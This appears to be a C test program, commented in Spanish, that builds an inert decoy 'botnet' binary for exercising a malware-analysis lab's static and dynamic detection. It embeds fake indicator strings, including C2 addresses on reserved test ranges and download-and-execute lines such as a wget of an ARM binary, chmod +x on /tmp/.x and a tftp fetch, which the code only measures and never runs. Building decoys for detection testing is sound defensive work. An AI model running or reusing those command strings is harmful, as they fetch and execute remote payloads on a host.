/*
 * senuelo_botnet.c — MUESTRA SEÑUELO BENIGNA (NO ES MALWARE)
 * ===========================================================
 *
 * Binario de PRUEBA para ejercitar el pipeline del laboratorio sin riesgo.
 *
 * Por FUERA parece una botnet ELF:
 *   - lleva incrustadas cadenas tipicas de C2, comandos IRC, IPs, rutas de
 *     persistencia, comandos de descarga, firmas tipo Mirai/Gafgyt/Tsunami...
 *     => el ANALISIS ESTATICO (strings + YARA) las detecta y "marca" la muestra.
 *
 * Por DENTRO no hace absolutamente NADA peligroso:
 *   - NO abre sockets ni hace ninguna conexion de red.
 *   - NO crea/borra/modifica archivos, ni toca cron/rc.local/systemd.
 *   - NO hace fork(), exec(), system(), ni lanza shells.
 *   - NO escala privilegios ni se copia a si mismo.
 *
 * Lo unico que hace al ejecutarse: imprime un banner avisando que es inerte y
 * duerme en un bucle (write + nanosleep) hasta que se agota el tiempo o lo
 * matan. Asi el ANALISIS DINAMICO captura syscalls — pero todas inofensivas.
 *
 * Las cadenas viven en un arreglo global y solo se "tocan" para contar su
 * longitud (jamas se usan como destino de conexion ni se ejecutan), de modo que
 * el compilador no las elimine y aparezcan en `strings`/`yara`, sin que el
 * binario haga nada con ellas.
 *
 * Uso (en la VM/sandbox del lab):
 *     ./senuelo_botnet            # corre ~60 s y termina
 *     ./senuelo_botnet 20         # corre 20 s y termina
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>

/*
 * "Indicadores de compromiso" FALSOS. Son solo texto inerte para que las reglas
 * YARA (linux_malware.yar, network_c2.yar, capabilities.yar...) y `strings`
 * tengan algo que detectar. NINGUNA de estas cadenas se usa para conectar,
 * ejecutar ni escribir nada.
 */
static const char *const SENUELOS[] = {
    /* --- C2 / red (network_c2.yar) --- */
    "http://192.0.2.66/bins/arm7.bin",      /* 192.0.2.0/24 = TEST-NET (RFC 5737) */
    "203.0.113.5:1337",                      /* 203.0.113.0/24 = TEST-NET-3 */
    "c2.senuelo-lab.invalid",                /* .invalid no resuelve nunca (RFC 2606) */
    "panel.botnet-falsa.ddns.net",
    "User-Agent: Mozilla/5.0 (compatible; Bot)",
    "Host: c2.senuelo-lab.invalid",
    "GET /gate.php?id=",
    /* --- comandos IRC (Red_IRC_C2 / Tsunami_Kaiten) --- */
    "PRIVMSG #control :",
    "NICK bot-",
    "USER bot 0 0 :infectado",
    "JOIN #control",
    "PING :",
    "PONG :",
    /* --- verbos de ataque DDoS (Gafgyt/Bashlite) --- */
    "UDPFLOOD",
    "HTTPFLOOD",
    "TCPFLOOD",
    "GETLOCALIP",
    "TSUNAMI",
    /* --- firmas tipo Mirai --- */
    "/dev/watchdog",
    "/bin/busybox",
    "TSource Engine Query",
    "/proc/net/tcp",
    /* --- persistencia (capabilities.yar) — solo TEXTO, no se escribe --- */
    "/etc/rc.local",
    "/etc/cron.hourly/",
    "/etc/init.d/",
    /* --- descarga+ejecucion (Red_Descarga_Shell) — solo TEXTO --- */
    "wget http://192.0.2.66/bins/arm7.bin",
    "chmod +x /tmp/.x",
    "tftp -g -r arm7.bin",
};

#define N_SENUELOS (sizeof(SENUELOS) / sizeof(SENUELOS[0]))

/*
 * "Procesa" los senuelos: solo suma sus longitudes. El unico proposito es que
 * el compilador conserve las cadenas en el binario. No conecta ni ejecuta nada.
 */
static unsigned long inventario_inerte(void)
{
    unsigned long total = 0;
    size_t i;
    for (i = 0; i < N_SENUELOS; i++)
        total += strlen(SENUELOS[i]);
    return total;
}

int main(int argc, char **argv)
{
    int segundos = (argc > 1) ? atoi(argv[1]) : 60;
    if (segundos <= 0)
        segundos = 60;

    printf("=== MUESTRA SENUELO BENIGNA (laboratorio) ===\n");
    printf("Este binario NO es malware. No hace red, ni archivos, ni exec.\n");
    printf("Cadenas-senuelo incrustadas: %lu (suma de %zu indicadores falsos)\n",
           inventario_inerte(), N_SENUELOS);
    printf("Durmiendo de forma inofensiva durante %d s...\n", segundos);
    fflush(stdout);

    /* Bucle inofensivo: solo nanosleep + un latido por stdout. */
    struct timespec un_segundo = {1, 0};
    for (int t = 0; t < segundos; t++) {
        nanosleep(&un_segundo, NULL);
        printf("latido %d/%d (sin actividad maliciosa)\n", t + 1, segundos);
        fflush(stdout);
    }

    printf("=== Fin. La muestra termino sin hacer nada. ===\n");
    return 0;
}
